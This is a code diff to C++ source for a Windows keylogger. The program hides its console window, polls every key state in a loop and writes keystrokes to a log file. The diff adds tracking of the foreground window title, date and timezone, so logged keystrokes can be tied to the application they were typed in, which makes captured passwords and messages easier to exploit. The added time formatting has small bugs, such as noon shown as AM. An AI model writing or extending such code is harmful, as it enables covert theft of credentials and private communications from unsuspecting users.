@@ -44,6 +44,17 @@ void SaveInFile(const string& Information) {
     logFile.close();
 }
 
+string currentWindow = "";
+string GetActiveWindowTitle() {
+    HWND hwnd = GetForegroundWindow();
+    if (hwnd != NULL) {
+        char windowTitle[256];
+        GetWindowText(hwnd, windowTitle, sizeof(windowTitle));
+        return string(windowTitle);
+    }
+    return "";
+}
+
 string SpecialKeys(int key) {
     string result;
     switch (key) {
@@ -281,6 +292,49 @@ int main() {
     ShowWindow(hwnd, SW_HIDE);
 
     while (true) {
+        string newWindow = GetActiveWindowTitle();
+        if (!newWindow.empty() && newWindow != currentWindow) {
+            currentWindow = newWindow;
+
+            // Get the current date and time
+            time_t now = time(0);
+            tm ltm;
+
+            // Use localtime_s instead of localtime
+            localtime_s(&ltm, &now);
+
+            // Format the date and time
+            stringstream ss;
+            ss << 1900 + ltm.tm_year << "-"
+                << 1 + ltm.tm_mon << "-"
+                << ltm.tm_mday << " ";
+
+            // Check if it's PM
+            if (ltm.tm_hour > 12) {
+                ss << ltm.tm_hour - 12 << ":"
+                    << ltm.tm_min << ":"
+                    << ltm.tm_sec << " PM";
+            }
+            else if (ltm.tm_hour == 0) {
+                ss << ltm.tm_hour + 12 << ":"
+                    << ltm.tm_min << ":"
+                    << ltm.tm_sec << " AM";
+            }
+            else {
+                ss << ltm.tm_hour << ":"
+                    << ltm.tm_min << ":"
+                    << ltm.tm_sec << " AM";
+            }
+
+            string dateTime = ss.str();
+
+            // Get the current timezone
+            _tzset();
+            string timezone = _tzname[0];
+
+            // Save the window title, date/time, and timezone in the file
+            SaveInFile("\n\n[" + currentWindow + " " + dateTime + " " + timezone + "]\n");
+        }
         for (int i = 8; i <= 190; i++) {
             if (GetAsyncKeyState(i) == -32767) {
                 isSpecial = std::find(std::begin(special_Key), std::end(special_Key), i) != std::end(special_Key);
@@ -307,6 +361,11 @@ int main() {
                 }
             }
         }
+
+        //remove later ( for testing only )
+        if (GetAsyncKeyState(VK_F1))
+            exit(0);
+
     }
 
     return 0;
